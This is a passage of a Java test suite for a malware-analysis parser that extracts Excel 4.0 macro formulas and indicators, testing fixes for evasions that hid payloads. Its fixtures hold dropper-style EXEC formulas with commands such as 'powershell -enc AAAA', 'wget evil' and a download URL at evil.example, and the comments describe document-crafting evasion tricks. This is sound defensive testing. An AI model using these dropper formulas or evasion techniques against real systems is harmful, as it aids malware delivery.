/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.tika.parser.microsoft.ooxml;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import org.apache.poi.openxml4j.opc.OPCPackage;
import org.apache.poi.openxml4j.opc.PackagePart;
import org.apache.poi.openxml4j.opc.PackagingURIHelper;
import org.apache.poi.xssf.usermodel.XSSFRelation;
import org.junit.jupiter.api.Test;

import org.apache.tika.metadata.Metadata;
import org.apache.tika.metadata.TikaCoreProperties;
import org.apache.tika.parser.ParseContext;
import org.apache.tika.sax.ToXMLContentHandler;
import org.apache.tika.sax.XHTMLContentHandler;

/**
 * THREE total-loss evasions on the XLM capture path, each reachable by a one-element or
 * one-byte edit to the document, each of which reported success while dropping the payload.
 *
 * <p>These are not budget shortfalls. In every case the capture ran to completion, set no
 * flag, and produced output that reads as a clean parse -- which is strictly worse for
 * triage than reporting nothing, because "no macro IOCs" is an actionable verdict and here
 * it was a false one. Each test asserts BOTH that the payload now survives AND that the
 * specific broken output is gone; asserting only the former is how three earlier fixes in
 * this area shipped half-done.
 */
class XlmEvasionResilienceTest {

    private static final String PAYLOAD = "powershell -enc AAAA";
    /** " " + "[...TIKA-XLM-FORMULA-TRUNCATED]" */
    private static final int XLM_TRUNCATION_MARKER_LEN = 32;

    // ── 1. A child element inside <f> replaced the whole formula ─────────────

    /**
     * {@code <f>} and {@code <v>} are SIBLINGS inside {@code <c>} in SpreadsheetML; they are
     * never nested. The handler shares one {@code buf} across both and cleared it on every
     * start tag, so the inner {@code <v>} wiped the formula that had already been read and
     * {@code </f>} then published the INNER element's text as the formula.
     *
     * <p>Result before this fix: formula {@code "0"}, {@code isTruncated()} false, IOCs
     * empty. A live dropper triaged as a clean macro-bearing workbook.
     */
    @Test
    void testNestedValueElementCannotEraseTheFormula() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<v>0</v></f>");

        String formula = onlyFormula(parser);
        assertTrue(formula.contains("EXEC") && formula.contains(PAYLOAD),
                "the formula must survive a nested <v>; got: " + formula);
        assertFalse("0".equals(formula),
                "REGRESSION GUARD: the inner <v> text must not become the formula -- that "
                        + "was the whole defect, and a test that only checks EXEC is present "
                        + "would still pass if the two were concatenated wrongly");
        assertEquals("=EXEC(\"" + PAYLOAD + "\")", formula,
                "the suppressed <v> must leave NO trace -- neither replacing the formula nor "
                        + "concatenated into it. Exact match is the assertion with teeth: a "
                        + "contains() check also passes on \"=EXEC(...)0\", which is wrong too.");
        assertTrue(parser.hasStructuralAnomaly(),
                "nested <f>/<v> is not something Excel emits, so it must be reported as an "
                        + "anomaly even though the content was preserved");
    }

    /** Same defect via {@code <t>}, the other element sharing {@code buf}. */
    @Test
    void testNestedTextElementCannotEraseTheFormula() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<is><t>decoy</t></is></f>");

        String formula = onlyFormula(parser);
        assertTrue(formula.contains(PAYLOAD), "got: " + formula);
        assertFalse(formula.contains("decoy"),
                "the suppressed nested element's text must not contaminate the formula");
        assertTrue(parser.hasStructuralAnomaly());
    }

    /**
     * A SECOND {@code <f>} in one {@code <c>} used to win outright (last-wins), so a dropper
     * could hide the payload behind a benign decoy. Both must survive, in either order,
     * because we cannot know which one Excel would honour.
     */
    @Test
    void testDuplicateFormulaElementKeepsBothNotJustTheLast() throws Exception {
        // Each <f> is retained as its own entry (not joined -- joining was quadratic and could
        // fabricate an IOC across the seam), so assert across ALL entries.
        XlmXmlMacrosheetParser decoyFirst = parseCellXml(
                "<f>=1+1</f><f>=EXEC(\"" + PAYLOAD + "\")</f>");
        String df = String.join(" | ", decoyFirst.getFormulaList());
        assertTrue(df.contains(PAYLOAD), "payload-last must survive: " + df);
        assertTrue(df.contains("1+1"), "the first <f> must not be discarded either: " + df);

        XlmXmlMacrosheetParser payloadFirst = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")</f><f>=1+1</f>");
        String pf = String.join(" | ", payloadFirst.getFormulaList());
        assertTrue(pf.contains(PAYLOAD),
                "payload-first must survive last-wins overwrite: " + pf);
        assertTrue(payloadFirst.hasStructuralAnomaly());
    }

    /** A legitimate single formula must NOT be flagged as anomalous. */
    @Test
    void testWellFormedCellIsNotFlaggedAsAnomalous() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")</f><v>0</v>");
        assertTrue(onlyFormula(parser).contains(PAYLOAD));
        assertFalse(parser.hasStructuralAnomaly(),
                "sibling <f> then <v> is the NORMAL shape -- flagging it would make the "
                        + "anomaly signal worthless");
    }

    /** Rich-text inline strings legitimately repeat sibling {@code <t>} runs. */
    @Test
    void testRichTextInlineStringStillConcatenatesAndIsNotFlagged() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<is><r><t>http://evil.example/</t></r><r><t>a.exe</t></r></is>", "inlineStr");
        String value = parser.getValues().values().stream().findFirst().orElse("");
        assertTrue(value.contains("http://evil.example/a.exe"),
                "split-payload inline runs must still concatenate; got: " + value);
        assertFalse(parser.hasStructuralAnomaly(),
                "multiple sibling <t> inside one <is> is normal rich text");
    }

    /**
     * The anomaly must reach METADATA, not just the parser's boolean.
     *
     * <p>Every other anomaly test above asserts {@code parser.hasStructuralAnomaly()} -- the
     * mechanism. None exercised the parser -> decorator -> metadata wiring, so a missing
     * {@code markXlmStructuralAnomaly} call or a misspelled key would have left the whole suite
     * green while the signal reached no consumer. Metadata is where every other capture signal
     * is read, so an unwired flag is a no-op fix.
     */
    @Test
    void testStructuralAnomalyReachesMetadataWithoutClaimingTruncation() throws Exception {
        Metadata metadata = new Metadata();
        processMacroSheets(metadata, new String[] {"aa-nested"},
                new String[] {cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")<v>0</v></f>", null)});

        assertTrue(Boolean.parseBoolean(metadata.get("msoffice:xlm-structural-anomaly")),
                "the anomaly must be published as metadata; got: "
                        + metadata.get("msoffice:xlm-structural-anomaly"));
        // The design claim, asserted rather than merely commented: this is an evasion TELL, not
        // a capture shortfall. Setting the truncation signals would inflate the flag that drives
        // re-analysis, and would wrongly say evidence was withheld when none was.
        assertNull(metadata.get(TikaCoreProperties.TRUNCATED_METADATA),
                "nothing was withheld, so TRUNCATED_METADATA must stay unset");
        assertFalse(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "capture completed in full, so the capture-limit flag must stay unset");
    }

    // ── 2. One malformed macrosheet erased the whole workbook's results ──────

    /**
     * A macrosheet truncated mid-tag threw {@code SAXParseException}, which the loop
     * rethrew, aborting the extractor before the CROSS-SHEET IOC scan, embedded-part
     * extraction, and {@code endDocument()}. So one broken part -- trivially
     * attacker-supplied -- suppressed XLM analysis for every OTHER sheet in the workbook,
     * with no flag whatsoever.
     *
     * <p>The broken part is named to sort FIRST, so this also proves the loop CONTINUES
     * rather than merely salvaging results gathered before the failure.
     */
    @Test
    void testOneMalformedMacrosheetDoesNotEraseTheOtherSheetsIocs() throws Exception {
        Metadata metadata = new Metadata();
        String out = processMacroSheets(metadata,
                new String[] {"aa-broken", "bb-payload"},
                new String[] {
                    // truncated mid-tag: no closing </c></row></sheetData></worksheet>
                    "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/"
                            + "2006/main\"><sheetData><row r=\"1\"><c r=\"A1\"><f>=EXEC(",
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
                });

        assertTrue(out.contains("EXEC: " + PAYLOAD),
                "the surviving sheet's EXEC IOC must still be scanned and emitted after an "
                        + "earlier part failed to parse. Output was:\n" + out);
        assertTrue(out.contains("xlm-parse-error"),
                "the failed part must be reported in the output, not swallowed");
        assertTrue(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "a part we could not parse means analysis was incomplete -- that must be "
                        + "flagged, because a silent empty result reads as a clean parse");
        assertNotNull(metadata.get(TikaCoreProperties.TRUNCATED_METADATA));
    }

    /** A clean two-part workbook must not acquire either signal. */
    @Test
    void testTwoWellFormedMacrosheetsSetNoFailureSignal() throws Exception {
        Metadata metadata = new Metadata();
        String out = processMacroSheets(metadata,
                new String[] {"aa-one", "bb-two"},
                new String[] {
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
                    cellXmlDoc("<f>=1+1</f>", null),
                });
        assertTrue(out.contains("EXEC: " + PAYLOAD));
        assertFalse(out.contains("xlm-parse-error"), out);
        assertFalse(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "clean input must not trip the incomplete-analysis flag");
    }

    // ── 3. XLSB: one unknown Ptg byte stripped the function call ─────────────

    /**
     * The decoder knows roughly 40 of ~200 Ptg opcodes. An unknown opcode has an unknown
     * OPERAND LENGTH, so the byte cursor desynchronizes and every later token is decoded
     * from misaligned bytes. Splicing one such byte into an EXEC formula turned
     * {@code =EXEC("powershell -enc AAAA")} into {@code ="powershell -enc AAAA"} -- the call
     * gone, the result emitted as a COMPLETE formula, no marker, no flag. Reported as inert
     * data instead of execution.
     */
    @Test
    void testUnknownPtgYieldsAMarkerNotASilentlyCompleteFormula() {
        byte[] spliced = execFormulaWithUnknownPtgSpliced(PAYLOAD);

        boolean[] incomplete = new boolean[1];
        String text = Biff12XlmFormulaDecoder.decode(spliced, incomplete);

        assertTrue(incomplete[0],
                "an undecodable Ptg stream must be reported to the caller");
        assertNotNull(text, "an undecodable stream should still yield the decoded prefix");
        assertTrue(text.contains(Biff12XlmFormulaDecoder.XLSB_UNDECODED_PTG_MARKER),
                "the emitted text must carry the incomplete-decode marker; got: " + text);
        assertFalse(text.equals("\"" + PAYLOAD + "\""),
                "REGRESSION GUARD: the exact broken output was a bare quoted string that "
                        + "reads as inert data. Asserting only that a marker exists would "
                        + "not catch a reintroduction that emitted the marker elsewhere.");
    }

    /**
     * ONE undecodable formula must not suppress every LATER cell's IOCs.
     *
     * <p>The first version of the unknown-Ptg fix reported the condition via
     * {@code ctx.markLimit()}. {@code EvalContext.isLimitReached()} is
     * {@code limitWarning != null}, and {@code XlmMacroEmulator.stopOnContextLimit} turns that
     * into {@code emulationAborted}, so one spliced junk byte took a macrosheet from three EXEC
     * indicators to ZERO -- a worse total-loss evasion than the one being fixed, and the same
     * one-part kill switch removed from the XML path in the same commit. A budget being spent
     * means "stop"; one bad formula means "this cell is untrustworthy". Different signals.
     *
     * <p>The corpus could not catch this: no sample in 3,084 documents hits an unknown Ptg.
     */
    @Test
    void testOneUndecodableFormulaDoesNotSuppressLaterCellsIocs() {
        XlmMacroEmulator emulator = new XlmMacroEmulator(
                new HashMap<>(), XlmWorkbookSheetMap.empty(), XlmMacroEmulator.Limits.DEFAULT);
        // Cell 0 is a single unhandled opcode; cells 1-3 are ordinary EXEC formulas.
        emulator.addMacroCell(0, new byte[] {(byte) 0x30});
        emulator.addMacroCell(1, execFormula("powershell -enc AAAA"));
        emulator.addMacroCell(2, execFormula("cmd /c calc"));
        emulator.addMacroCell(3, execFormula("wget evil"));

        emulator.emulate();
        List<String> iocs = emulator.iocs;
        long execs = iocs.stream().filter(s -> s.startsWith("EXEC:")).count();
        assertEquals(3, execs,
                "all three EXEC command lines must survive a junk byte in an EARLIER cell; "
                        + "got " + iocs);
        assertTrue(emulator.isLimitReached(),
                "the undecodable cell must still be REPORTED -- not aborting is not the same "
                        + "as staying silent");
    }

    /** A well-formed EXEC must decode with no marker and no signal. */
    @Test
    void testWellFormedExecFormulaIsNotMarked() {
        boolean[] incomplete = new boolean[1];
        String text = Biff12XlmFormulaDecoder.decode(execFormula(PAYLOAD), incomplete);

        assertNotNull(text);
        assertTrue(text.contains("EXEC"), "got: " + text);
        assertFalse(incomplete[0],
                "a fully decodable formula must not be reported as incomplete");
        assertFalse(text.contains(Biff12XlmFormulaDecoder.XLSB_UNDECODED_PTG_MARKER),
                "marking a clean formula would make the marker worthless; got: " + text);
    }

    // ── 4. Extraction was not reproducible ──────────────────────────────────

    /**
     * Emulated {@code NOW()}/{@code TODAY()} read the WALL CLOCK, so the parse timestamp
     * landed in the extracted TEXT (a {@code REGISTER: 46244.7446875} line). Two runs of the
     * same binary over the same 1,123-document XLSB corpus disagreed on 47 documents.
     *
     * <p>That breaks anything keyed on extracted text -- dedup, caches, and A/B comparisons
     * between builds, which is how this was found: a corpus diff attributed 47 "regressions"
     * to a change that had not caused them. The differing value carries no analyst signal;
     * the {@code TIME_GATE} IOC is the actionable part and still fires.
     */
    @Test
    void testNowIsDeterministicSoExtractionIsReproducible() {
        Object first = evalNow();
        assertTrue(first instanceof Double && (Double) first > 0,
                "still a usable serial, so time-gate comparisons resolve; got: " + first);

        // Repeated-call equality is NOT sufficient and must not be relied on: the old
        // wall-clock path had toSecondOfDay() resolution, so calls within the same second
        // returned an identical double and that assertion passed AGAINST the bug. Verified by
        // mutation -- restoring the wall clock left the whole suite green.
        // The assertion with teeth is that the value is nowhere near TODAY's serial, which a
        // wall-clock read can never satisfy.
        long todaySerial = java.time.temporal.ChronoUnit.DAYS.between(
                java.time.LocalDate.of(1899, 12, 30),
                java.time.LocalDate.now(java.time.ZoneOffset.UTC));
        assertTrue(Math.abs((Double) first - todaySerial) > 1000,
                "NOW() returned " + first + ", within 1000 days of today's serial "
                        + todaySerial + " -- that is the wall clock, which puts the parse "
                        + "timestamp into extracted text and makes output irreproducible.");

        for (int i = 0; i < 5; i++) {
            assertEquals(first, evalNow(), "NOW() must fold to a FIXED serial");
        }
    }

    /** The time-gate IOC must survive the determinism fix -- that is the analyst signal. */
    @Test
    void testTimeGateIocStillFires() {
        Biff12XlmFormulaDecoder.EvalContext ctx = newCtx();
        Biff12XlmFormulaDecoder.evaluateFormula(nowFormula(), ctx);
        assertTrue(ctx.iocs.stream().anyMatch(s -> s.contains("TIME_GATE")),
                "the time-gate tell must still be reported; got: " + ctx.iocs);
    }

    /**
     * A far-future clock is the conservative pick: droppers gate on
     * {@code NOW() > <past date>} to stop detonating after a campaign window, so the fixed
     * clock must take the same branch the wall clock did.
     */
    @Test
    void testFixedClockIsLateEnoughToPassRealisticTimeGates() {
        // Excel serial for 2030-01-01 is ~47484; anything a live dropper compares against is
        // far earlier. The fixed clock must exceed it, or emulation loses reach.
        assertTrue(Biff12XlmFormulaDecoder.EMULATION_CLOCK_SERIAL > 47484,
                "clock serial " + Biff12XlmFormulaDecoder.EMULATION_CLOCK_SERIAL
                        + " would make NOW()>past-date gates evaluate FALSE, silently "
                        + "shrinking emulation coverage");
    }

    // ── 5. A 22-byte record could allocate 514 MiB ───────────────────────────

    /**
     * The formula-size field was validated against the operator-settable knob, not against the
     * bytes actually present, so a tiny record declaring a huge size allocated that much before
     * {@code readBytes} noticed the shortfall and discarded the formula anyway.
     */
    @Test
    void testOversizedLengthFieldDoesNotAllocateBeyondTheRecord() throws Exception {
        // 22-byte header, formula-size field claims 512 MiB, zero formula bytes follow.
        byte[] record = ByteBuffer.allocate(22).order(ByteOrder.LITTLE_ENDIAN)
                .putInt(0).putInt(0).putDouble(0).putShort((short) 0)
                .putInt(512 * 1024 * 1024).array();

        int[] dropped = new int[1];
        long before = usedHeap();
        Biff12XlmMacrosheetParser parser = new Biff12XlmMacrosheetParser(
                new ByteArrayInputStream(new byte[0]),
                new XHTMLContentHandler(new ToXMLContentHandler(), new Metadata(),
                        new ParseContext()),
                null, Integer.MAX_VALUE, () -> dropped[0]++);
        parser.handleRecord(0x0009, record);
        long grew = usedHeap() - before;

        assertEquals(1, dropped[0],
                "dropping a formula must be reported, not silent");
        assertTrue(grew < 64L * 1024 * 1024,
                "a 22-byte record must not allocate hundreds of MiB; heap grew " + grew
                        + " bytes. maxFormulaRecordBytes is operator-settable to "
                        + "Integer.MAX_VALUE, so the knob cannot be the only ceiling.");
    }

    // ── 6. Raising the formula cap silently narrowed IOC scanning ────────────


    // ── 7. Holes review found in the FIRST version of these fixes ────────────

    /**
     * A {@code <t>} directly inside {@code <f>} -- NOT inside an {@code <is>} -- used to skip
     * the suppression guard entirely, because suppression was keyed on the element NAME plus
     * {@code inInlineString}. Its text was appended to the formula and no anomaly was flagged,
     * producing exactly the {@code =EXEC(...)DECOY} concatenation the first test calls wrong.
     */
    @Test
    void testNonInlineTextElementInsideFormulaIsSuppressedAndFlagged() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<t>DECOY</t></f>");

        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
                "a <t> child of <f> must be suppressed like any other nested element");
        assertTrue(parser.hasStructuralAnomaly(),
                "and it must still be reported as an anomaly");
    }

    /**
     * {@code endElement} decremented {@code suppressDepth} for any {@code f}/{@code v}/{@code t}
     * close while {@code startElement} only incremented for some, so a {@code <t/>} inside a
     * suppressed {@code <v>} LIFTED that suppression and the rest of the {@code <v>}
     * contaminated the formula. Increment and decrement must be symmetric.
     */
    @Test
    void testSuppressionCannotBeLiftedByAnUnmatchedCloseTag() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(\"" + PAYLOAD + "\")<v><t/>DECOY2</v></f>");

        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
                "text after an unmatched </t> inside a suppressed <v> must stay suppressed");
        assertTrue(parser.hasStructuralAnomaly());
    }

    /**
     * A foreign-namespace child must be suppressed (its characters would otherwise land in the
     * formula) AND must not leak suppression depth. The namespace filter in {@code endElement}
     * runs AFTER the decrement precisely so the depth comes back down; otherwise every later
     * element on the sheet would be silently swallowed.
     */
    @Test
    void testForeignNamespaceChildIsSuppressedWithoutLeakingDepth() throws Exception {
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\" xmlns:x=\"urn:example:other\"><sheetData>"
                + "<row r=\"1\"><c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")"
                + "<x:junk>DECOY3</x:junk></f></c>"
                + "<c r=\"B1\"><f>=EXEC(\"second-cell\")</f></c></row>"
                + "</sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        // Assert the payload is PRESENT, not merely that the decoy is absent. Asserting only
        // absence was vacuous: with the depth leaked, </f> is consumed as a suppressed close so
        // the cell flushes empty, and "does not contain DECOY3" passes on a formula that was
        // lost entirely. Verified by mutation -- moving the namespace filter back above the
        // decrement left this test green until this assertion was added.
        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
                "the payload must survive a foreign-namespace child, uncontaminated; got: "
                        + parser.getFormulaList());
        assertTrue(parser.getFormulaList().stream().anyMatch(f -> f.contains("second-cell")),
                "and the NEXT cell must still be captured -- if suppressDepth leaked, "
                        + "everything after the foreign element would be swallowed. Got: "
                        + parser.getFormulaList());
        assertEquals(2, parser.getFormulas().size(),
                "both cells must be recorded; got: " + parser.getFormulas());
    }

    /**
     * A part that is not XML at all must be flagged, and the other sheet must survive it.
     *
     * <p>SCOPE NOTE, so this is not mistaken for more than it is: the report is now gated on a
     * {@code parseFailed} BOOLEAN rather than on {@code parseError != null}, because an
     * exception with a null {@code getMessage()} previously produced no text note and no
     * metadata flag. That null-message path is defensive and is NOT covered here -- every
     * exception this fixture can provoke through the real SAX layer carries a message, and
     * mutation confirmed it: reverting the gate to {@code parseError != null} leaves this test
     * green. The boolean is kept because it cannot be worse, not because a test proves it.
     */
    @Test
    void testUnparseablePartIsFlaggedAndTheOtherSheetSurvives() throws Exception {
        Metadata metadata = new Metadata();
        String out = processMacroSheets(metadata, new String[] {"aa-broken", "bb-payload"},
                new String[] {
                    "   not xml at all",
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
                });

        assertTrue(out.contains("xlm-parse-error"),
                "the failed part must be reported in the output. Got:\n" + out);
        assertTrue(Boolean.parseBoolean(
                        metadata.get("msoffice:xlm-capture-limit-reached")),
                "and flagged in metadata regardless of whether the exception had a message");
        assertTrue(out.contains("EXEC: " + PAYLOAD),
                "the surviving sheet's IOC must still be scanned");
    }

    /**
     * A replacement that FITS must be admitted. The charge was made net but the admission gate
     * stayed gross, so a replacement was tested against a total that already counted the entry
     * it replaces -- the same double-count, moved from the accumulator into the gate.
     *
     * <p>Reachable on purpose: a benign short decoy at a cell ref, then the payload at the SAME
     * ref once the budget is nearly spent, and the payload is the one dropped.
     */
    @Test
    void testReplacementThatFitsIsAdmittedNotRejectedAgainstItsOwnOldLength() throws Exception {
        String decoy = "=" + "D".repeat(300);
        String payload = "=EXEC(\"" + PAYLOAD + "\")";
        // Aggregate budget 310: the 301-char decoy fits, and the 29-char payload fits on NET
        // accounting (0 + 29) but not on GROSS (301 + 29 = 330 > 310). The window matters --
        // a looser cap leaves both accountings passing and the test proves nothing, which is
        // exactly what a first version of this test did.
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">"
                + "<c r=\"A1\"><f>" + decoy + "</f></c>"
                + "<c r=\"A1\"><f>" + payload + "</f></c>"
                + "</row></sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 4096, 4096, 4096, 4096, 340);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        // Both are kept (see testDuplicateCellRefKeepsBothAndIsFlagged): a duplicated ref is
        // malformed and we cannot know which one Excel honours, so neither may be discarded.
        String kept = String.join(" | ", parser.getFormulaList());
        assertTrue(kept.contains(PAYLOAD),
                "the payload must survive a decoy at the same cell ref; got: " + kept);
        assertTrue(kept.contains("DDD"), "and the decoy is kept too; got: " + kept);
        assertFalse(parser.isTruncated(),
                "the combined text fit the aggregate cap, so no truncation may be reported -- "
                        + "reporting one here fabricates an evidence loss");
        assertEquals(parser.getFormulaList().stream().mapToInt(String::length).sum(),
                parser.getRetainedFormulaChars(),
                "THE INVARIANT: the budget charge must equal exactly what is stored. This is "
                        + "what catches both gross charging (billing per overwrite) and under-"
                        + "charging (storing more than was billed).");
    }

    // ── 8. A repeated cell ref burned budget it never retained ───────────────

    /**
     * {@code formulas} is keyed by cell ref, so a repeated ref REPLACES the prior entry -- but
     * the document-wide budget was charged the full length every time. A sheet repeating one
     * cell ref therefore drained the budget with content that was never retained, cutting
     * capture short for LATER sheets that did carry payload.
     */
    @Test
    void testRepeatedCellRefDoesNotDoubleChargeTheBudget() throws Exception {
        String cell = "<c r=\"A1\"><f>=" + "C".repeat(400) + "</f></c>";
        String rows = "<row r=\"1\">" + cell.repeat(20) + "</row>";
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/"
                + "2006/main\"><sheetData>" + rows + "</sheetData></worksheet>";

        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        // Aggregate budget of 2000 chars: one 401-char formula fits many times over, but 20
        // full charges (8020) would blow it and trip the truncation flag.
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 4096, 4096, 4096, 4096, 2000);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        // Each repetition gets its own key rather than overwriting, and the AGGREGATE cap is
        // what bounds how many are kept: 4 x 401 = 1604 fits under 2000, the 5th would not.
        assertEquals(4, parser.getFormulas().size(),
                "repetitions are retained under distinct keys, bounded by the aggregate cap; "
                        + "got: " + parser.getFormulas().size());
        assertTrue(parser.isTruncated(),
                "and refusing the later repetitions must be reported, since evidence WAS "
                        + "withheld once the cap bit");
        // Repetitions are CONCATENATED rather than dropped, so the charge grows with what is
        // actually stored -- and that is the invariant worth pinning. The earlier version of
        // this test asserted a fixed ceiling (~500), which encoded the old replace-and-discard
        // behaviour and would have to be edited every time the retention policy changed.
        int stored = parser.getFormulaList().stream().mapToInt(String::length).sum();
        assertEquals(stored, parser.getRetainedFormulaChars(),
                "THE INVARIANT: charged must equal stored, summed over ALL retained entries. "
                        + "Gross charging billed per overwrite for content never kept; charged "
                        + parser.getRetainedFormulaChars() + " for " + stored + " stored chars");
        assertTrue(parser.getRetainedFormulaChars() <= 2000,
                "the aggregate cap bounds the total, so a repeated ref cannot grow without "
                        + "limit; charged " + parser.getRetainedFormulaChars());
    }

    // ── 9. Residuals from the review, now fixed ──────────────────────────────


    /**
     * A duplicated {@code <c r="...">} used to let a benign decoy DELETE the payload from
     * {@code formulas} -- the same last-wins evasion fixed one level down for a duplicated
     * {@code <f>}, left live at the cell level. {@code formulas} feeds the IOC scanner and the
     * MACRO entry, so the payload vanished from every structured output with no flag.
     */
    @Test
    void testDuplicateCellRefKeepsBothAndIsFlagged() throws Exception {
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">"
                + "<c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")</f></c>"
                + "<c r=\"A1\"><f>=1+1</f></c>"
                + "</row></sheetData></worksheet>";
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        // Kept as SEPARATE entries under distinct keys, not concatenated -- concatenation was
        // quadratic and could fabricate an IOC across the join.
        String all = String.join(" | ", parser.getFormulaList());
        assertTrue(all.contains(PAYLOAD),
                "the payload must not be deleted by a later decoy at the same ref; got: " + all);
        assertTrue(all.contains("1+1"), "and the decoy is kept too; got: " + all);
        assertEquals(2, parser.getFormulas().size(),
                "each occurrence gets its own key; got: " + parser.getFormulas().keySet());
        assertTrue(parser.hasStructuralAnomaly(),
                "a duplicated cell ref is not something Excel emits");
    }

    /**
     * {@code ValueCharBudget} was charged GROSS on a repeated cell ref while the map kept one
     * copy, so duplicate cells drained the document value budget and starved the split URL/IP
     * fragments the map exists to capture. Same net-vs-gross error as the formula path.
     */
    @Test
    void testValueBudgetChargesNetOnReplacement() {
        XSSFExcelExtractorDecorator.ValueCharBudget budget =
                new XSSFExcelExtractorDecorator.ValueCharBudget(2048);

        assertTrue(budget.tryRetain(1024), "first value fits");
        // Same cell ref overwritten twice more: each replaces 1024 chars, so net stays 1024.
        assertTrue(budget.tryRetain(1024, 1024), "a replacement must be charged NET");
        assertTrue(budget.tryRetain(1024, 1024), "and again -- the map still holds ONE copy");
        // A genuinely NEW entry still consumes budget, and the cap still bites.
        assertTrue(budget.tryRetain(1024), "a new entry consumes the remaining budget");
        assertFalse(budget.tryRetain(1, 0),
                "the cap must still bite once genuinely full -- net accounting must not "
                        + "become no accounting");
    }

    /**
     * {@code markXlmCaptureLimit} returned early once the flag was set, so exactly ONE reason was
     * ever recorded -- and an attacker picks which fires first, hiding a severe diagnosis behind
     * a cheap one. The flag is idempotent; the warnings accumulate.
     */
    @Test
    void testDistinctCaptureWarningsAllReachMetadata() throws Exception {
        Metadata metadata = new Metadata();
        // A broken part AND an over-long formula: two DIFFERENT diagnoses, both of which must
        // reach metadata. Per-part parse errors deliberately collapse to ONE constant slot (see
        // testDecoyPartsCannotCrowdOutLaterDiagnoses -- naming the part made the warning
        // attacker-multipliable), so the thing to pin is that distinct KINDS accumulate.
        processMacroSheets(metadata, new String[] {"aa-broken", "bb-payload"},
                new String[] {
                    "   not xml at all",
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")<v>0</v></f>", null),
                });

        String[] warnings = metadata.getValues(TikaCoreProperties.TIKA_META_EXCEPTION_WARNING);
        assertTrue(java.util.Arrays.stream(warnings).anyMatch(w -> w.contains("parse error")),
                "the parse error must be recorded; got: " + java.util.Arrays.toString(warnings));
        assertTrue(java.util.Arrays.stream(warnings)
                        .anyMatch(w -> w.contains("duplicated") || w.contains("nested")),
